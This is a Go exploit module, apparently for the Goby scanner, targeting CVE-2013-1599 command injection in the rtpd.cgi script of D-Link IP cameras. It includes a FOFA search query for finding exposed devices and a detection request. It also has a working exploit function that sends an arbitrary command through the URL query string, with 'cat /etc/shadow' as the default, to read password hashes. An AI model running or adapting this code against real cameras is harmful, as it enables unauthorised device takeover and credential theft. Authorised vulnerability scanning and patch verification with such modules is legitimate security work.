package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DLINK rtpd.cgi Command Injection (CVE-2013-1599)",
    "Description": "A Command Injection vulnerability exists in the /var/www/cgi-bin/rtpd.cgi script in D-Link IP Cameras DCS-3411/3430 firmware 1.02, DCS-5605/5635 1.01, DCS-1100L/1130L 1.04, DCS-1100/1130 1.03, DCS-1100/1130 1.04_US, DCS-2102/2121 1.05_RU, DCS-3410 1.02, DCS-5230 1.02, DCS-5230L 1.02, DCS-6410 1.00, DCS-7410 1.00, DCS-7510 1.00, and WCS-1100 1.02, which could let a remote malicious user execute arbitrary commands through the camera's web interface.",
    "Impact": "DLINK rtpd.cgi Command Injection (CVE-2013-1599)",
    "Recommendation": "<p>Search the official website for the model to upgrade the corresponding firmware:<a href=\"https://support.dlink.com/\">https://support.dlink.com/</a></p>",
    "Product": "D_Link-DCS-IP-camera",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "D-LINK及SparkLAN等多款摄像头远程命令执行（CVE-2013-1599）",
            "Description": "D-LINK及SparkLAN等多款摄像头远程命令执行（CVE-2013-1599），可在未授权条件下远程执行命令读取设备口令，导致设备被控制。受影响设备有\nDCS-3411/3430 - firmware v1.02\nDCS-5605/5635 - v1.01\nDCS-1100L/1130L - v1.04\nDCS-1100/1130 - v1.03\nDCS-1100/1130 - v1.04_US\nDCS-2102/2121 - v1.05_RU\nDCS-3410 - v1.02\nDCS-5230 - v1.02\nDCS-5230L - v1.02\nDCS-6410 - v1.00\nDCS-7410 - v1.00\nDCS-7510 - v1.00\nWCS-1100 - v1.02",
            "Impact": "<p>未经身份验证的远程攻击者通过相机的Web接口，可在受影响设备中执行任意命令，导致设备被控制。<br></p>",
            "Recommendation": "<p>官网搜索型号升级相应固件：<a href=\"https://support.dlink.com/\" target=\"_blank\">https://support.dlink.com/</a></p>",
            "Product": "D-LINK及SparkLAN摄像头",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "DLINK rtpd.cgi Command Injection (CVE-2013-1599)",
            "Description": "A Command Injection vulnerability exists in the /var/www/cgi-bin/rtpd.cgi script in D-Link IP Cameras DCS-3411/3430 firmware 1.02, DCS-5605/5635 1.01, DCS-1100L/1130L 1.04, DCS-1100/1130 1.03, DCS-1100/1130 1.04_US, DCS-2102/2121 1.05_RU, DCS-3410 1.02, DCS-5230 1.02, DCS-5230L 1.02, DCS-6410 1.00, DCS-7410 1.00, DCS-7510 1.00, and WCS-1100 1.02, which could let a remote malicious user execute arbitrary commands through the camera's web interface.",
            "Impact": "DLINK rtpd.cgi Command Injection (CVE-2013-1599)",
            "Recommendation": "<p>Search the official website for the model to upgrade the corresponding firmware:<a href=\"https://support.dlink.com/\" target=\"_blank\">https://support.dlink.com/</a><br></p>",
            "Product": "D_Link-DCS-IP-camera",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "server==\"dcs-lig-httpd\"",
    "GobyQuery": "server==\"dcs-lig-httpd\"",
    "Author": "atdpa4sw0rd@gmail.com",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2021-06-03",
    "References": [
        "http://www.exploit-db.com/exploits/25138",
        "http://www.securityfocus.com/bid/59564",
        "https://exchange.xforce.ibmcloud.com/vulnerabilities/83941",
        "https://packetstormsecurity.com/files/cve/CVE-2013-1599",
        "https://seclists.org/fulldisclosure/2013/Apr/253",
        "https://www.coresecurity.com/advisories/d-link-ip-cameras-multiple-vulnerabilities",
        "https://nvd.nist.gov/vuln/detail/CVE-2013-1599",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1599"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2013-1599"
    ],
    "CNVD": [
        "CNVD-2013-04632"
    ],
    "CNNVD": [
        "CNNVD-201305-030"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/shadow",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/cgi-bin/rtpd.cgi?ps")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "var/www/cgi-bin/rtpd.cgi") && strings.Contains(resp.Utf8Html, "/sbin/watchDog")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := fmt.Sprintf("/cgi-bin/rtpd.cgi?%s", strings.Replace(cmd, " ", "&", -1))
			fmt.Print(uri)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html[:len(resp.Utf8Html)-63]
			}
			return expResult
		},
	))
}
